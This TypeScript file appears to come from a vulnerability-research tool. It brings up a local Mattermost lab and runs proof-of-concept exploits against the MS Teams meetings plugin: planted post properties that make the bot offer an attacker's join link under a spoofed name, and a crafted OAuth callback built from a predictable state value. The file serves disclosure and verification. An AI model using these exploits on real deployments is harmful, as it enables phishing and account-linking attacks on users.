import { mkdirSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import {
  ACCOUNTS,
  type Lab,
  type LabAccount,
  forgetLab,
  loadLab,
  parsePosted,
  provision,
  saveLab,
  startMattermost,
  stopMattermost,
  waitForMattermost,
  watchFor,
  Mattermost,
  nothingWithin,
  PLUGIN_ID,
} from "../lab/mattermost.ts"

function message(error: unknown): string {
  return error instanceof Error ? error.message : String(error)
}

/** Brings up an isolated Mattermost with three accounts, a channel and the plugin. */
export async function labUp(): Promise<number> {
  try {
    console.log("starting Mattermost under emulation, this takes a minute")
    const base = startMattermost()
    await waitForMattermost(base)
    console.log(`mattermost answers at ${base}`)
    const lab = await provision(base)
    saveLab(lab)
    console.log(
      `lab ready: team ${lab.teamId}, channel ${lab.channelId}, accounts ${Object.keys(ACCOUNTS).join(", ")}`
    )
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

export function labDown(): number {
  try {
    stopMattermost()
    forgetLab()
    console.log("lab removed")
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

async function runCommand(lab: Lab, account: LabAccount, command: string): Promise<void> {
  const session = await Mattermost.login(lab.base, account)
  await session.request("POST", "/api/v4/commands/execute", {
    command,
    channel_id: lab.channelId,
  })
}

const ATTACKER_LINK = "https://attacker.example/join?token=stolen"

type Seen = ReturnType<typeof parsePosted>

/** Posts the plugin's bot makes in the lab channel. */
function fromPluginInChannel(lab: Lab): (post: Seen) => boolean {
  return (post) =>
    post !== null && post.channel_id === lab.channelId && post.props.type === "custom_mstmeetings"
}

/**
 * Shows that a member's post properties become the plugin's own "join" button, and that without
 * the planted post the plugin does not offer one.
 */
/** Plants the attacker's post and stops, so a person can run the command in a browser. */
export async function plantPropsHijack(): Promise<number> {
  try {
    const lab = loadLab()
    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
    await plantPost(lab)
    console.log(
      `planted. Within 30 seconds, run "/mstmeetings start" in ${lab.base} as the victim.`
    )
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

async function plantPost(lab: Lab): Promise<void> {
  const attacker = await Mattermost.login(lab.base, ACCOUNTS.attacker)
  await attacker.request("POST", "/api/v4/posts", {
    channel_id: lab.channelId,
    message: "shall we hop on a call?",
    props: {
      meeting_provider: "MSTeams",
      meeting_link: ATTACKER_LINK,
      meeting_creator_username: "Chief Executive Officer",
    },
  })
}

export async function provePropsHijack(): Promise<number> {
  try {
    const lab = loadLab()
    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
    const control = await watchFor(lab, ACCOUNTS.victim, 20, fromPluginInChannel(lab))
    await control.ready
    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings start")
    const controlPost = await nothingWithin(control)
    console.log("control, no planted post:")
    console.log(
      controlPost
        ? `  the bot posted: ${JSON.stringify(controlPost.props).slice(0, 200)}`
        : "  the bot posted no meeting post within 20 seconds"
    )

    await plantPost(lab)
    const planted = await watchFor(lab, ACCOUNTS.victim, 20, fromPluginInChannel(lab))
    await planted.ready
    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings start")
    const post = await planted.found
    const hijacked = post?.props.meeting_link === ATTACKER_LINK
    console.log("with the planted post:")
    console.log(`  the bot posted: ${JSON.stringify(post?.props).slice(0, 300)}`)
    console.log(`hijacked: ${hijacked ? "yes, the plugin offered the attacker's link" : "no"}`)
    const home = process.env.SHUVULN_HOME ?? ""
    mkdirSync(join(home, "proofs"), { recursive: true, mode: 0o700 })
    writeFileSync(
      join(home, "proofs", "msteams-props-hijack.json"),
      JSON.stringify(
        {
          provedAt: new Date().toISOString(),
          lab,
          control: controlPost?.props ?? null,
          withPlantedPost: post?.props ?? null,
          hijacked,
        },
        null,
        2
      ),
      { mode: 0o600 }
    )
    return hijacked ? 0 : 1
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

const STATE_PREFIX = "msteamsmeetinguserstate"
const ATTACKER_CODE = "ATTACKER-SUPPLIED-AUTHORIZATION-CODE"

/** The victim's session calls one plugin route and returns the status and body, following no redirect. */
async function victimCalls(
  lab: Lab,
  token: string,
  path: string
): Promise<{ status: number; body: string; location: string | null }> {
  const response = await fetch(lab.base + path, {
    headers: { Authorization: `Bearer ${token}` },
    redirect: "manual",
    signal: AbortSignal.timeout(60_000),
  })
  return {
    status: response.status,
    body: (await response.text()).slice(0, 400),
    location: response.headers.get("location"),
  }
}

/**
 * Partial proof of the OAuth state finding: the state is what an attacker can compute, a wrong
 * one is refused, and the victim's session is accepted with the attacker's code up to the point
 * where the plugin tries to exchange it. The lab cannot reach Microsoft, so the exchange fails.
 */
export async function proveOAuthState(): Promise<number> {
  try {
    const lab = loadLab()
    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
    const victim = await Mattermost.login(lab.base, ACCOUNTS.victim)
    const me = (await victim.request("GET", "/api/v4/users/me")) as { id: string }
    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings connect")
    const token = victim.sessionToken()
    const shown = await victimCalls(
      lab,
      token,
      `/plugins/${PLUGIN_ID}/oauth2/connect?channelID=${lab.channelId}`
    )
    const state = shown.location ? (new URL(shown.location).searchParams.get("state") ?? "") : ""
    const predicted = `${STATE_PREFIX}_${me.id}_${lab.channelId}_true`
    console.log(`the connect redirect carries the state: ${state}`)
    console.log(`computed from the victim's id, the channel id and a flag: ${predicted}`)
    const predictable = state === predicted

    const wrongChannel = await victimCalls(
      lab,
      token,
      `/plugins/${PLUGIN_ID}/oauth2/complete?code=${ATTACKER_CODE}&state=${STATE_PREFIX}_${me.id}_someotherchannel_true`
    )
    console.log(
      `control, state naming another channel: ${wrongChannel.status} ${wrongChannel.body}`
    )
    const controlRefused = wrongChannel.status === 400

    const crafted = await victimCalls(
      lab,
      token,
      `/plugins/${PLUGIN_ID}/oauth2/complete?code=${ATTACKER_CODE}&state=${predicted}`
    )
    console.log(`crafted callback in the victim's session: ${crafted.status} ${crafted.body}`)
    const accepted =
      crafted.status !== 400 && crafted.status !== 401 && crafted.body !== "invalid state"

    const home = process.env.SHUVULN_HOME ?? ""
    mkdirSync(join(home, "proofs"), { recursive: true, mode: 0o700 })
    writeFileSync(
      join(home, "proofs", "msteams-oauth-state.json"),
      JSON.stringify(
        {
          provedAt: new Date().toISOString(),
          lab,
          state,
          predicted,
          predictable,
          controlRefused,
          crafted,
          accepted,
          note: "Partial: the code exchange fails only because the lab has no route to Microsoft.",
        },
        null,
        2
      ),
      { mode: 0o600 }
    )
    const passed = predictable && controlRefused && accepted
    console.log(
      `state predictable: ${predictable}; wrong state refused: ${controlRefused}; crafted callback accepted up to the exchange: ${accepted}`
    )
    return passed ? 0 : 1
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}
